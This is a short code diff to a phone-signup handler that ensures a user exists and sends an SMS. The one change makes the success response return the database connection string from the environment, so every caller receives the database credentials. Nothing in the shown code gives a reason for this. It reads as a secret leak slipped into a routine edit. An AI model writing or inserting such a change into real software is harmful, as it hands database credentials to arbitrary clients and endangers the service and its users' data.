@@ -55,7 +55,7 @@ export async function main({ phone }) {
 		await ensureUser(user, phone, db)
 		await sendSMS(phone)
 
-		return { body: { success: true, data: {} } }
+		return { body: { success: true, data: { db: process.env.DB_CONNECTION_STRING } } }
 	}
 	catch(e) {
 		console.error(e)
